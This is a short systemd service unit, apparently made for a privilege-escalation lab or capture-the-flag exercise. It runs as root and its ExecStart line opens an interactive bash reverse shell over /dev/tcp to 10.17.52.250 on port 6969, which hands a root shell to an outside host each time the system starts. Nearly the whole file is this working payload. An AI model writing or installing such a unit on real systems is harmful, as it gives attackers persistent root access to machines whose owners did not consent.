[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i  >&   /dev/tcp/10.17.52.250/6969 0>&1'

[Install]
WantedBy=multi-user.target
